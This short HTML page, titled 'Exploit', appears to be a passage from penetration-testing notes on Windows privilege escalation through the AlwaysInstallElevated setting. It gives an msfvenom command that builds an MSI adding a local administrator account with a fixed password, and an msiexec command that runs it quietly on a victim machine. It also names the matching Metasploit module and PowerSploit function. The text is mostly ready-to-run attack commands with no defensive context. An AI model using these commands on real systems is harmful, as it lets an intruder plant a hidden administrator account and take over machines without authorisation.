<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Exploit</title>
</head><body>Now that we know AlwaysInstallElevated is enabled for both the local machine and the current user, we can proceed to utilize MSFVenom to generate an MSI file that, when executed on the victim machine, will add a user to the Local Administrators group:<br/>
<br/>
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi<br/>
<br/>
Once you have our newly created MSI file loaded on the victim, we can leverage a command-line tool within Windows, Msiexec, to covertly (in the background) run the installation:<br/>
<br/>
#quiet=suppress messages, qn=no gui, i=regular (vs admin) installation<br/>
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi<br/>
<br/>
Note: MSI files created with MSFVenom as well as with the always_install_elevated module discussed below, will fail during installation. This behavior is intentional and meant to prevent the installation being registered with the operating system.<br/>
<br/>
Metasploit: exploit/windows/local/always_install_elevated<br/>
Set QUIET<br/>
<br/>
<br/>
<br/>
Advanced Installer (free edition)<br/>
PowerSploit: Write-UserAddMSI</body></html>